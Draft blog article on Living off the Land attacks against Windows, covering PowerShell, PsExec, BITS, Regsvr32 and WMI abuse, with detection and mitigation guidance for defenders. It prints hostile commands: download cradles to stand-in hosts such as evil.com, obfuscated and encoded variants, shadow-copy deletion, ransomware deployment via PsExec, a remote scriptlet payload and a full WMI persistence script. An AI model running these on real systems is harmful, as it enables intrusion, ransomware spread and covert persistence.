@@ -1,0 +1,1002 @@
+---
+title: "Living off the Land: When Legitimate Tools Become Weapons"
+description: "A technical analysis of LOLBAS (Living off the Land Binaries and Scripts) techniques: how attackers weaponize native Windows tools like PowerShell, PsExec, and WMI to evade detection and bypass security controls."
+date: "2026-01-08"
+author: "Mohamed Habib Jaouadi"
+tags: ["threat-hunting", "lolbas", "powershell", "windows-internals", "evasion", "detection-engineering", "blue-team", "incident-response"]
+banner: "/banners/posts/living-off-the-land.jpg"
+bannerAlt: "Living off the Land Attacks - Legitimate Tools as Attack Vectors"
+visibility: "draft"
+---
+
+> **Blue Team Focus:** This article explores Living off the Land (LOTL) techniques from a defensive perspective. Understanding how attackers weaponize legitimate tools is essential for detection engineering, threat hunting, and incident response.
+
+## Introduction
+
+Imagine investigating a security incident where the attacker never dropped a single piece of malware. No suspicious executables, no custom binaries, no "evil.exe" in sight. Instead, they accomplished their entire mission: credential theft, lateral movement, data exfiltration, etc., using only the tools that Microsoft ships with every Windows installation. Welcome to the world of **Living off the Land** (LOTL) attacks.
+
+Living off the Land represents one of the most challenging paradigms in modern threat detection. Attackers leverage **LOLBAS** (Living off the Land Binaries and Scripts); legitimate executables, scripts, and libraries that exist in every Windows environment, in order to achieve their malicious objectives while blending seamlessly into normal administrative activity. These tools are digitally signed by Microsoft, often implicitly trusted or difficult to restrict without operational impact, and used daily by legitimate administrators, making traditional signature-based detection alone insufficient.
+
+The Multi-State Information Sharing and Analysis Center (MS-ISAC) reports that cyber threat actors (CTAs) increasingly prefer LOTL techniques as defenders have become more sophisticated at detecting custom malware. This shift represents a fundamental challenge: **How do you detect malicious use of legitimate tools?**
+
+In this deep dive, we'll dissect the evolving LOTL landscape—shifting from the "magic binary" era of 2020 to the **trust boundary and configuration abuse** era of 2026. We will examine real-world attack patterns, from ransomware operators to nation-state actors, and explore detection engineering strategies that separate malicious activity from benign administrative tasks.
+
+### Traditional Malware vs. Living off the Land
+
+| Feature | Custom Malware | Living off the Land (LOTL) |
+| :--- | :--- | :--- |
+| **Origin** | Attacker-developed / purchased | Native to the OS (signed by MS) |
+| **Detection** | Signature-based (easy) | Behavioral-based (hard) |
+| **Whitelisting** | Usually blocked | Usually explicitly trusted |
+| **Footprint** | Files dropped on disk | Low-artifact / memory-resident |
+| **Signed?** | Unsigned or stolen certs | Digitally signed by Microsoft |
+
+<hr className="section-divider" />
+
+## Understanding the LOTL Philosophy
+
+### Why Living off the Land?
+
+From an attacker's perspective, LOTL techniques offer several compelling advantages that custom malware simply cannot match:
+
+**Stealth Through Legitimacy**: Tools like PowerShell, WMI, and PsExec are digitally signed by Microsoft. They often bypass basic application whitelisting, are often implicitly trusted or difficult to restrict without operational impact, and appear in countless legitimate administrative workflows. An attacker executing `powershell.exe` to download and execute a payload looks nearly identical to an IT administrator deploying software updates.
+
+**Evasion by Design**: Traditional antivirus and EDR solutions rely heavily on signature-based detection and behavioral analysis of *known-malicious* binaries. When the binary itself is `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`, a legitimate Microsoft executable, signature-based detection alone is insufficient. Behavioral detection becomes the primary viable approach, but distinguishing malicious behavior from legitimate administration is extraordinarily difficult.
+
+**Operational Resilience**: Custom malware requires development effort, testing infrastructure, and operational security to maintain. If a sample is captured and reverse-engineered, the entire tool chain may be compromised. LOLBAS tools, by contrast, are maintained by Microsoft, automatically updated, and will continue functioning regardless of how many times they're "detected" and analyzed.
+
+**Reduced Forensic Footprint**: Many LOTL techniques execute entirely in memory, leaving minimal artifacts on disk. These low-artifact / memory-resident attacks using PowerShell in-memory execution, for example, may evade disk-based forensic tools entirely. Process memory analysis becomes essential, but most organizations lack the capability to perform continuous memory forensics at scale.
+
+**The 2026 Shift: Living-off-the-Misconfiguration**: As "classic" LOLBINs become heavily signatured and restricted, modern attackers have pivoted. The focus has moved from finding a "magic binary" to abusing **trust inheritance**, **configuration boundaries**, and **legitimate execution paths**. LOTL is no longer just about *which* tool you use, but *where* and *how* you abuse the system's inherent trust.
+
+### The LOLBAS Landscape
+
+The LOLBAS project (https://lolbas-project.github.io/) catalogs Windows binaries and scripts that can be abused by attackers. In 2026, many of these are considered **Tripwire Tools**—any execution in a non-admin context creates a high-priority alert. Common categories include:
+
+<LOLBASCategories />
+
+**Native Windows Utilities**:
+- `powershell.exe` / `pwsh.exe` - Scripting engine with .NET access
+- `wmic.exe` - Windows Management Instrumentation Command-line
+- `regsvr32.exe` - DLL registration utility
+- `rundll32.exe` - DLL function launcher
+- `mshta.exe` - HTML Application host
+- `certutil.exe` - Certificate utility with download capabilities
+- `bitsadmin.exe` - Background Intelligent Transfer Service admin
+
+**Administration Tools**:
+- `psexec.exe` - Sysinternals remote execution tool
+- `winrm` / `Enter-PSSession` - PowerShell remoting
+- `schtasks.exe` - Scheduled task manager
+- `sc.exe` - Service control manager
+- `net.exe` - Network administration utility
+
+**Development Tools**:
+- `msbuild.exe` - Microsoft Build Engine
+- `csc.exe` - C# compiler
+- `installutil.exe` - .NET installer utility
+- `regasm.exe` / `regsvcs.exe` - .NET assembly registration
+
+The MS-ISAC Cyber Threat Intelligence (CTI) team observes consistent abuse patterns across different threat actor profiles, from commodity ransomware operators to sophisticated nation-state actors, all converging on the same set of LOLBAS tools.
+
+## Deep Dive: PowerShell as an Attack Platform
+
+### PowerShell: The Swiss Army Knife of LOTL
+
+PowerShell represents the single most abused LOLBAS tool in modern threat landscapes. Originally designed as a powerful automation and management framework for Windows administrators, its capabilities make it an ideal platform for attackers:
+
+- **Full .NET Framework Access**: Direct access to the entire .NET Framework, enabling complex operations without additional tools
+- **Reflective Loading**: Ability to load assemblies directly into memory without touching disk
+- **Remote Execution**: Native remoting capabilities for lateral movement
+- **Script Obfuscation**: Trivial to obfuscate and encode payloads
+- **Ubiquitous Presence**: Installed by default on all modern Windows systems; PowerShell Core (`pwsh.exe`) is also increasingly relevant in cross-platform administrative workflows.
+
+### Real-World PowerShell Abuse Patterns
+
+Major threat actors have weaponized PowerShell extensively:
+
+**REvil Ransomware** uses PowerShell to delete Volume Shadow Copies (preventing recovery), download additional payloads, and enumerate network shares for encryption targeting. Their typical command chain looks like:
+
+```powershell
+# Delete shadow copies to prevent recovery
+powershell.exe -Command "Get-WmiObject Win32_Shadowcopy | ForEach-Object {$_.Delete();}"
+
+# Download and execute payload
+powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command "IEX(New-Object Net.WebClient).DownloadString('http://c2-server.com/payload.ps1')"
+```
+
+**Pysa Ransomware** employs PowerShell scripts to:
+- Deploy ransomware across multiple hosts
+- Stop and disable Windows Defender services
+- Delete Volume Shadow Copies
+- Modify local user accounts for persistence
+- Broadcast system information and MAC addresses
+- Modify README files to allow double-click execution
+
+**Hancitor Downloader** (a common initial access broker) uses PowerShell to:
+- Execute encoded commands from malicious Word document macros
+- Download second-stage payloads
+- Execute in-memory payloads without disk artifacts
+
+### Command-Line Obfuscation Techniques
+
+Attackers rarely use PowerShell with obvious command lines. Instead, they employ various obfuscation techniques to evade detection:
+
+**Encoded Commands** are the most common obfuscation method. PowerShell accepts Base64-encoded commands via the `-EncodedCommand` parameter. While the command line appears opaque, the decoded content reveals the malicious intent:
+
+```powershell
+# Original malicious command
+IEX(New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')
+
+# Base64 encoded version
+powershell.exe -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGUAdgBpAGwALgBjAG8AbQAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA
+
+# The base64 encoded string is generated via
+$cmd = "IEX(New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')"
+$bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
+[Convert]::ToBase64String($bytes)
+```
+
+**Parameter Shortening** exploits PowerShell's parameter abbreviation feature, where parameters can be shortened to any unique prefix:
+
+```powershell
+# Full command
+powershell.exe -ExecutionPolicy Bypass -EncodedCommand [base64]
+
+# Shortened variants that work identically
+powershell.exe -ep bypass -e [base64]
+powershell.exe -ec [base64]
+powershell.exe -encodedcommand [base64]
+powershell.exe -encoded [base64]
+powershell.exe -enc [base64]
+powershell.exe -en [base64]
+```
+
+**String Obfuscation** techniques include random character injection and case randomization:
+
+```powershell
+# Character injection (^ ^ + $ % characters)
+I^E^X(N^e^w-O^b^j^e^c^t N^e^t.W^e^b^C^l^i^e^n^t)
+
+# Random case capitalization
+iEx(nEw-ObJeCt neT.wEbClIeNt).dOwNLoAdStRiNg('http://evil.com/payload')
+
+# Backtick escaping
+I`E`X(N`ew-Ob`ject N`et.WebCl`ient)
+```
+
+### PowerShell Obfuscation Playground
+
+To better understand how attackers hide their intent, use the interactive playground below to see common obfuscation techniques in action. Notice how a simple download cradle becomes nearly unrecognizable to basic string-based detections.
+
+<PowerShellPlayground />
+
+> [!CAUTION]
+> **2026 Reality Check: PowerShell EncodedCommand**
+> While still functional, `-EncodedCommand` is now an **instant alert** in most mature EDR environments. Modern operators prefer "PowerShell without PowerShell" techniques (WMI, .NET inline compilation) to avoid the high-signal `-enc` parameter.
+
+### Detection Engineering for PowerShell Abuse
+
+Detecting malicious PowerShell requires a layered approach that combines command-line analysis, script block logging, and behavioral analytics.
+
+**Command-Line Pattern Detection**:
+
+Key indicators of malicious PowerShell execution include:
+
+```regex
+# Encoded commands (any parameter variant)
+-e[ncodedcommand]{0,13}\s+[A-Za-z0-9+/=]{50,}
+
+# Download cradles
+(New-Object.*Net\.WebClient|IWR|Invoke-WebRequest|wget|curl).*Download
+
+# Execution policy bypass
+-[Ee]x?e?c?u?t?i?o?n?[Pp]olicy\s+(Bypass|Unrestricted)
+
+# Hidden window execution
+-[Ww]indow[Ss]tyle\s+Hidden
+
+# Remote execution
+Invoke-Command.*-ComputerName
+Enter-PSSession.*-ComputerName
+```
+
+**Script Block Logging** (Event ID 4104) captures the actual deobfuscated PowerShell code that executes, even if the command line is encoded. This is invaluable for analysis:
+
+```powershell
+# Enable PowerShell Script Block Logging via Group Policy
+Computer Configuration -> Administrative Templates -> Windows Components
+-> Windows PowerShell -> Turn on PowerShell Script Block Logging: Enabled
+
+# Or via registry
+Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 1
+```
+
+**Anti-Malware Scan Interface (AMSI)** integration allows antivirus and EDR solutions to inspect PowerShell script content before execution. However, sophisticated attackers routinely bypass AMSI through various techniques (memory patching, reflection, etc.).
+
+**Behavioral Analytics** for PowerShell should flag:
+
+- PowerShell spawned from suspicious parents (Excel, Word, Outlook)
+- PowerShell creating network connections to external IPs
+- PowerShell spawning unusual child processes
+- PowerShell with high counts of special characters (^, +, $, %, `)
+- Execution with `-EncodedCommand` from non-administrative users
+
+**Baseline Analysis** is critical. Not all encoded PowerShell is malicious; many legitimate management tools use encoding. Defenders must:
+
+1. Establish a baseline of normal PowerShell usage in their environment
+2. Decode and analyze encoded commands to identify patterns
+3. Whitelist known-good encoded commands (like those from SCCM or legitimate RMM tools)
+4. Focus detection on deviations from the baseline
+
+## PsExec: Lateral Movement at Scale
+
+### Understanding PsExec Architecture
+
+PsExec, part of Microsoft's Sysinternals suite, is a legitimate remote administration tool that allows IT administrators to execute processes on remote systems without manually installing client software. Its architecture makes it ideal for both administrators and attackers:
+
+**PsExec Operation Flow**:
+
+1. **SMB Connection**: PsExec establishes an SMB connection to the target system using administrative credentials (accessing the `ADMIN$` share)
+2. **Service Installation**: It copies `PSEXESVC.EXE` to the target's `C:\Windows\` directory via the `ADMIN$` share
+3. **Service Creation**: It creates and starts a Windows service that runs `PSEXESVC.EXE`
+4. **Command Execution**: The service executes the specified command, redirecting input/output through a named pipe
+5. **Cleanup**: After execution, PsExec stops the service and deletes `PSEXESVC.EXE`
+
+The named pipe used for communication follows the pattern: `\\.\pipe\psexesvc-[hostname]-[random]`
+
+### Ransomware and PsExec Abuse
+
+Ransomware operators have weaponized PsExec extensively for lateral movement and mass encryption:
+
+**DoppelPaymer**, **Ryuk**, **Sodinokibi** (REvil), and **Nefilim** ransomware families all use PsExec to:
+- Propagate ransomware executables across domain-joined systems
+- Execute ransomware remotely on multiple hosts simultaneously
+- Spread through networks after initial compromise
+
+A typical Ryuk ransomware deployment command looks like:
+
+```cmd
+psexec.exe \\target-host -u DOMAIN\admin -p Password123 -d -f -s C:\Windows\Temp\ryuk.exe
+```
+
+Parameters explained:
+- `\\target-host` - Target system
+- `-u` / `-p` - Credentials (often stolen via Mimikatz)
+- `-d` - Don't wait for process to terminate (fire and forget)
+- `-f` - Force copy even if file exists
+- `-s` - Run as SYSTEM account
+- `C:\Windows\Temp\ryuk.exe` - Ransomware payload
+
+> [!TIP]
+> **2026 Reality Check: Binary Renaming**
+> Renaming `psexec.exe` to `taskhost.exe` or similar is a legacy evasion technique. Modern detection doesn't just look for the process name; it tracks **Named Pipe patterns** (`\pipe\psexesvc`) and **internal metadata**, which often remain constant. Mature actors now favor **COM Hijacking** or **Service binary path modification** for more stealthy lateral movement.
+
+### Detection Strategies for PsExec Abuse
+
+**Named Pipe Monitoring** provides high-fidelity detection opportunities:
+
+Common legitimate named pipes in Active Directory environments:
+```
+\\.\pipe\netlogon
+\\.\pipe\samr
+\\.\pipe\lsarpc
+\\.\pipe\srvsvc
+\\.\pipe\winreg
+```
+
+Suspicious named pipes to monitor:
+```
+\\.\pipe\psexesvc*
+\\.\pipe\remcom*  (RemCom - PsExec alternative)
+\\.\pipe\paexec*  (PAExec - PsExec alternative)
+\\.\pipe\csexec*  (CSExec - PsExec alternative)
+```
+
+**Event Log Analysis**:
+
+PsExec activity generates distinctive event patterns:
+
+- **Event ID 7045** (System Log): A service was installed - Look for service name "PSEXESVC"
+- **Event ID 5140** (Security Log): A network share object was accessed - Look for `ADMIN$` access
+- **Event ID 5145** (Security Log): Network share object accessed with details showing `PSEXESVC.EXE`
+- **Event ID 4688** (Security Log): New process creation - Track `PSEXESVC.EXE` execution
+
+**Binary Metadata Detection**:
+
+PsExec and its alternatives can be renamed, but their internal metadata remains constant. Hunt for:
+
+| Binary Internal Name | Expected Process Name | If Mismatch → Alert |
+|---------------------|----------------------|---------------------|
+| `psexec` or `Psexec Service Host` | `psexec.exe` or `psexesvc.exe` | ⚠️ Renamed PsExec (Renamed binaries often retain internal metadata, though custom-built alternatives may not) |
+| `remcom` | `remcom.exe` or `RemComSvc.exe` | ⚠️ RemCom tool |
+| `paexec` | `paexec.exe` | ⚠️ PAExec tool |
+| `csexec` | `csexec.exe` | ⚠️ CSExec tool |
+
+**Mitigation Through Alternatives**:
+
+One effective detection strategy is to reduce legitimate noise. If your organization doesn't use PsExec, any occurrence is automatically suspicious. Consider migrating to **PowerShell Remoting** for administrative tasks:
+
+```powershell
+# PowerShell Remoting (WinRM) as PsExec alternative
+Invoke-Command -ComputerName target-host -ScriptBlock { Get-Process }
+Enter-PSSession -ComputerName target-host
+```
+
+PowerShell Remoting provides similar functionality with better logging, authentication options, and more distinctive network signatures that make legitimate use easier to baseline.
+
+## BITSAdmin: Persistence Through Transfer Jobs
+
+### Background Intelligent Transfer Service (BITS)
+
+BITS is a Windows service designed to transfer files asynchronously, intelligently managing bandwidth and resuming interrupted transfers. It's commonly used by Windows Update, SCCM, and other legitimate software distribution systems. Attackers abuse BITS for:
+
+- **File Download**: Downloading payloads while evading firewall rules (BITS uses legitimate system processes)
+- **Persistence**: BITS jobs survive reboots and can execute commands upon completion, error, or modification. These jobs may survive basic persistence cleanup and reboots if not explicitly enumerated.
+- **Detection Evasion**: BITS job information is stored in a database (`qmgr.db`), not the registry, bypassing registry-based detection
+
+### KEGTAP and Ransomware Delivery
+
+Mandiant research identified a sophisticated BITS abuse technique used to deploy **Ryuk ransomware** via **KEGTAP** (a BazarLoader variant):
+
+> [!CAUTION]
+> **2026 Reality Check: BITS Persistence**
+> While technically reliable, BITS persistence is rarely used as primary long-term persistence in 2026 because modern EDRs specifically audit the BITS database (`qmgr.db`) for `SetNotifyCmdLine` entries. Today, it is primarily used for **initial payload staging** and **transient execution triggers**.
+
+<BITSAdminAttackFlow />
+
+**Attack Flow**:
+
+1. **Initial Compromise**: BazarLoader infects the victim system
+2. **BITS Job Creation**: KEGTAP creates a malicious BITS job with specific parameters:
+   ```cmd
+   bitsadmin /create /download MyJob
+   bitsadmin /addfile MyJob http://localhost/nonexistent.file C:\temp\output.txt
+   bitsadmin /SetNotifyCmdLine MyJob C:\Windows\Temp\kegtap.exe ""
+   bitsadmin /resume MyJob
+   ```
+
+3. **Error Trigger**: The BITS job attempts to download from `http://localhost/nonexistent.file`, which obviously fails
+4. **Notification Execution**: When the BITS job enters an error state, it triggers the `SetNotifyCmdLine` command, executing `kegtap.exe`
+5. **Payload Delivery**: KEGTAP fetches and deploys the actual malware (Cobalt Strike, Brute Ratel, Metasploit, or Ryuk)
+
+This technique is particularly insidious because:
+- The actual malware download occurs *after* the BITS job triggers
+- The BITS job itself appears to be downloading from `localhost`, not an external C2
+- The persistence mechanism survives reboots and scheduled tasks cleanup
+
+### Detection and Prevention
+
+**Monitoring BITS Activity**:
+
+Query all BITS jobs on a system:
+```cmd
+bitsadmin /list /allusers /verbose
+```
+
+PowerShell enumeration:
+```powershell
+Get-BitsTransfer -AllUsers | Select-Object DisplayName,JobState,FileList,NotifyCmdLine
+```
+
+**Critical BITSAdmin Parameters to Monitor**:
+
+```
+- /create - Creates new BITS jobs
+- /transfer - Creates and immediately starts a transfer
+- /addfile - Adds files to transfer
+- /SetNotifyFlags - Configures notification triggers
+- /SetNotifyCmdLine - Sets command to execute (HIGHEST RISK)
+- /SetMinRetryDelay - Modifies retry behavior
+- /SetCustomHeaders - Adds custom HTTP headers
+- /Resume - Resumes suspended job
+```
+
+**Event Log Sources for BITS**:
+
+- **Event ID 59** (Microsoft-Windows-Bits-Client/Operational): BITS started transferring a job
+- **Event ID 60**: BITS stopped transferring a job
+- **Event ID 61**: BITS finished transferring a job
+- **Event ID 64**: BITS job error occurred
+
+Look specifically for jobs with `SetNotifyCmdLine` configured, as legitimate software rarely uses this feature.
+
+**Group Policy Mitigation**:
+
+```
+Computer Configuration -> Administrative Templates -> Windows Components 
+-> Background Intelligent Transfer Service (BITS)
+
+Configure:
+- Maximum job lifetime: Reduce from default (90 days)
+- Maximum download time: Reduce from default (54000 seconds / 15 hours)
+- Do not allow BITS peercaching: Enabled (prevents BITS from serving files)
+```
+
+Registry-based configuration:
+```powershell
+# Reduce BITS job lifetime to 7 days
+Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\BITS" -Name "JobInactivityTimeout" -Value 604800
+
+# Reduce maximum download time to 1 hour
+Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\BITS" -Name "MaxDownloadTime" -Value 3600
+```
+
+**Access Control**:
+
+Limit which users can create BITS jobs. In high-security environments, only allow BITS access to:
+- SYSTEM account (for Windows Update)
+- Specific service accounts (for SCCM, software deployment)
+- IT administrator groups (with strong monitoring)
+
+## Regsvr32: DLL Execution and Scriptlet Abuse
+
+### Regsvr32 Fundamentals
+
+`Regsvr32.exe` is a legitimate Windows utility that registers and unregisters DLLs and ActiveX controls in the Windows Registry. Attackers abuse it because:
+
+- **Application Whitelisting Bypass**: Regsvr32 is digitally signed and whitelisted by default
+- **Remote Execution**: Can load DLLs from remote UNC paths and execute scriptlets fetched over HTTP
+- **Scriptlet Support**: Can execute Windows Script Component (`.sct`) files containing JavaScript or VBScript
+- **Proxy Execution**: Regsvr32 executes code, but the payload doesn't touch disk as a `.exe`
+
+### IcedID Delivery Campaigns
+
+IcedID banking trojan campaigns extensively leverage Regsvr32 for initial infection:
+
+**Attack Chain**:
+
+1. **Phishing Email**: Victim receives email with malicious Word document attachment
+2. **Macro Execution**: User enables macros, triggering embedded VBA code
+3. **HTTP Request**: Macro generates HTTP GET request to attacker-controlled server
+4. **DLL Download**: Server responds with malicious DLL payload
+5. **Regsvr32 Execution**: Macro executes:
+   ```cmd
+   regsvr32.exe /s /i C:\Users\victim\Documents\malicious_library.dll
+   ```
+6. **Payload Activation**: The DLL's `DllRegisterServer` function contains malicious code that executes
+
+The malicious DLL is saved in the same directory as the Word document, making it appear semi-legitimate in forensic analysis.
+
+### Squiblydoo Technique (T1218.010)
+
+The "Squiblydoo" technique (named by security researcher Casey Smith) abuses Regsvr32's ability to fetch and execute remote scriptlets:
+
+```cmd
+regsvr32.exe /s /n /u /i:http://evil.com/payload.sct scrobj.dll
+```
+
+Parameters explained:
+- `/s` - Silent mode (no message boxes)
+- `/n` - Don't call `DllRegisterServer`
+- `/u` - Unregister mode (actually not used, just confuses analysts)
+- `/i:URL` - Optional command line string (abused to fetch remote scriptlet)
+- `scrobj.dll` - Windows Script Component runtime (legitimate Microsoft DLL)
+
+The `.sct` file contains embedded JavaScript or VBScript:
+
+```xml
+<?XML version="1.0"?>
+<scriptlet>
+<registration
+    description="Malicious Scriptlet"
+    progid="Malicious.Script"
+    version="1.00"
+    classid="{F0001111-0000-0000-0000-0000FEEDACDC}"
+>
+<script language="JScript">
+<![CDATA[
+    var shell = new ActiveXObject("WScript.Shell");
+    shell.Run("powershell.exe -enc [base64_payload]");
+]]>
+</script>
+</registration>
+</scriptlet>
+```
+
+When Regsvr32 processes this scriptlet, the embedded script executes with the privileges of the user, downloading and executing the next-stage payload.
+
+> [!WARNING]
+> **2026 Reality Check: The Death of Squiblydoo**
+> The Squiblydoo technique (`regsvr32 + scrobj.dll`) has reached its shelf life. Extensive signature coverage and the 2024 Windows hardening of `scrobj.dll` have made remote scriptlet execution highly unreliable. Modern LOTL has moved "upstream" to **DLL Side-Loading** and **COM Object registration**.
+
+### Detection Engineering for Regsvr32 Abuse
+
+**Process Monitoring** with EDR or Sysmon (Event ID 1):
+
+Suspicious Regsvr32 patterns:
+```
+# Remote scriptlet execution
+regsvr32.exe /s /n /u /i:http* scrobj.dll
+
+# Network connection from regsvr32.exe (unusual)
+regsvr32.exe making outbound HTTP/HTTPS connections
+
+# Regsvr32 spawned from suspicious parent
+WINWORD.EXE -> cmd.exe -> regsvr32.exe
+EXCEL.EXE -> powershell.exe -> regsvr32.exe
+```
+
+**Network Detection**:
+
+Regsvr32 should rarely initiate network connections. Monitor for:
+- Regsvr32.exe establishing TCP connections to external IPs
+- HTTP User-Agent from regsvr32.exe: `Mozilla/4.0 (compatible; MSIE 7.0; Windows NT ...)`
+- DNS queries from regsvr32.exe process
+
+**File Monitoring**:
+
+Track DLL files being loaded by Regsvr32:
+- DLLs in temporary directories (`%TEMP%`, `%APPDATA%`)
+- DLLs with suspicious names or random alphanumeric strings
+- DLLs created recently by Office applications
+
+**Mitigation with AppLocker**:
+
+Use AppLocker to restrict Regsvr32 execution to authorized users:
+
+```xml
+<FilePathRule Id="[GUID]" Name="Block Regsvr32 for standard users" 
+  Description="Prevent non-admin Regsvr32 execution" 
+  UserOrGroupSid="S-1-1-0" Action="Deny">
+  <Conditions>
+    <FilePathCondition Path="%System32%\regsvr32.exe" />
+  </Conditions>
+</FilePathRule>
+```
+
+**Windows Firewall Mitigation**:
+
+Block Regsvr32 from accessing the internet:
+
+```powershell
+New-NetFirewallRule -DisplayName "Block Regsvr32 Internet Access" `
+  -Direction Outbound `
+  -Program "%SystemRoot%\System32\regsvr32.exe" `
+  -Action Block `
+  -Profile Any
+```
+
+This prevents remote scriptlet loading while still allowing local DLL registration for legitimate purposes.
+
+## WMI and WMIC: The Administrator's Swiss Army Knife
+
+### Windows Management Instrumentation (WMI)
+
+WMI is a powerful management framework that provides a unified interface for system administration. Attackers leverage WMI for:
+
+- **Remote Code Execution**: Execute processes on remote systems
+- **Lateral Movement**: Move through networks with administrative credentials
+- **Reconnaissance**: Enumerate users, processes, services, network configuration
+- **Persistence**: Create WMI event subscriptions that execute code on triggers
+- **Detection Evasion**: WMI introduces indirect process ancestry that weakens simplistic parent-child detections (e.g., Office macro -> WMI -> PowerShell)
+
+### WMI for Remote Execution
+
+> [!NOTE]
+> **2026 Shift: The Decline of WMIC**
+> While `wmic.exe` is the "classic" interface, it is deprecated and increasingly removed in modern Windows builds. Mature actors have pivoted to using **WMI via PowerShell (CIM cmdlets)**, **DCOM directly via PowerShell**, or **inline C#** to avoid the high-signal `wmic.exe` process footprint.
+
+Attackers use `wmic.exe` to execute commands on remote systems:
+
+```cmd
+# Remote process creation
+wmic /node:target-host /user:DOMAIN\admin /password:Pass123 process call create "cmd.exe /c powershell.exe -enc [payload]"
+
+# Remote service query
+wmic /node:target-host service where "name='WinDefend'" get State,Status
+
+# Remote user enumeration
+wmic /node:target-host useraccount get name,sid
+```
+
+The equivalent using PowerShell WMI cmdlets:
+
+```powershell
+# Remote process execution via WMI
+Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c calc.exe" -ComputerName target-host
+
+# Query remote system information
+Get-WmiObject -Class Win32_OperatingSystem -ComputerName target-host
+```
+
+### WMI Lateral Movement & Behavioral Anomaly
+
+The signature of a WMI-based attack is often found in the **network flow** and **process ancestry**. Legitimate administrative WMI traffic typically originates from system service hosts, whereas attackers often pivot from user-space applications like Office or web browsers.
+
+<WMIRemoteFlow />
+
+### WMI Event Subscriptions for Persistence
+
+WMI Event Subscriptions provide a powerful persistence mechanism that survives reboots and is difficult to detect:
+
+**WMI Persistence Components**:
+
+1. **Event Filter**: Defines the trigger condition (e.g., system startup, specific time, file creation)
+2. **Event Consumer**: Defines the action to take (e.g., execute command, run script)
+3. **Filter-to-Consumer Binding**: Links the filter and consumer together
+
+**Example Malicious WMI Persistence**:
+
+```powershell
+# Create Event Filter (triggers at system startup)
+$FilterArgs = @{
+    Name = 'SystemStartupFilter'
+    EventNameSpace = 'root\cimv2'
+    QueryLanguage = 'WQL'
+    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 200 AND TargetInstance.SystemUpTime < 320"
+}
+$Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments $FilterArgs
+
+# Create Event Consumer (executes PowerShell payload)
+$ConsumerArgs = @{
+    Name = 'MaliciousConsumer'
+    CommandLineTemplate = 'powershell.exe -NoProfile -WindowStyle Hidden -enc [base64_payload]'
+}
+$Consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments $ConsumerArgs
+
+# Bind Filter to Consumer
+$BindingArgs = @{
+    Filter = $Filter
+    Consumer = $Consumer
+}
+Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments $BindingArgs
+```
+
+This persistence mechanism:
+- Executes automatically on system startup
+- Survives reboots
+- Does not appear in registry Run keys or Scheduled Tasks
+- Requires WMI namespace enumeration to discover
+
+### Detection Strategies for WMI Abuse
+
+**Command-Line Detection**:
+
+Monitor for suspicious `wmic.exe` usage:
+
+```
+# Remote process creation
+wmic.*process call create
+
+# Suspicious parent process
+WINWORD.EXE -> wmic.exe
+EXCEL.EXE -> wmic.exe
+
+# Base64-encoded command execution
+wmic.*-enc|encodedcommand
+```
+
+**WMI Event Consumer Detection**:
+
+Enumerate WMI event subscriptions using PowerShell:
+
+```powershell
+# List all WMI Event Filters
+Get-WmiObject -Namespace root\subscription -Class __EventFilter | 
+  Select-Object Name, Query
+
+# List all WMI Event Consumers
+Get-WmiObject -Namespace root\subscription -Class __EventConsumer |
+  Select-Object Name, @{Label="Type";Expression={$_.__CLASS}}
+
+# List Filter-to-Consumer Bindings
+Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding |
+  Select-Object Consumer, Filter
+```
+
+Indicators of malicious WMI event subscriptions:
+- Consumers executing PowerShell, cmd.exe, or rundll32.exe
+- Filters with suspicious query conditions (frequent intervals, unusual WQL)
+- Recently created bindings (compare against baseline)
+- Consumers with encoded commands or URLs in command lines
+
+**Sysmon Configuration for WMI**:
+
+Sysmon Event IDs for WMI monitoring:
+
+- **Event ID 19**: WMIEventFilter activity detected
+- **Event ID 20**: WMIEventConsumer activity detected  
+- **Event ID 21**: WMIEventConsumerToFilter activity detected
+
+Sample Sysmon configuration:
+
+```xml
+<Sysmon schemaversion="4.82">
+  <EventFiltering>
+    <RuleGroup name="WMI Persistence" groupRelation="or">
+      <WmiEvent onmatch="include">
+        <Operation condition="is">Created</Operation>
+      </WmiEvent>
+    </RuleGroup>
+  </EventFiltering>
+</Sysmon>
+```
+
+**Forensic Collection at Scale**:
+
+For enterprise-wide hunting, collect WMI persistence data using PowerShell Remoting:
+
+```powershell
+# Collect WMI event consumers from all domain computers
+$Computers = Get-ADComputer -Filter * | Select-Object -ExpandProperty Name
+
+$Results = Invoke-Command -ComputerName $Computers -ScriptBlock {
+    $Filters = Get-WmiObject -Namespace root\subscription -Class __EventFilter
+    $Consumers = Get-WmiObject -Namespace root\subscription -Class __EventConsumer
+    $Bindings = Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding
+    
+    [PSCustomObject]@{
+        ComputerName = $env:COMPUTERNAME
+        Filters = $Filters
+        Consumers = $Consumers
+        Bindings = $Bindings
+    }
+} -ErrorAction SilentlyContinue
+
+# Export for analysis
+$Results | Export-Csv -Path C:\WMI_Persistence_Hunt.csv -NoTypeInformation
+```
+
+Store results in a centralized database (Elasticsearch, Splunk, or SQL) for anomaly detection across thousands of endpoints. Baseline your environment to understand normal WMI usage, then alert on deviations.
+
+<hr className="section-divider" />
+
+## Beyond Binaries: The Modern LOTL Frontier
+
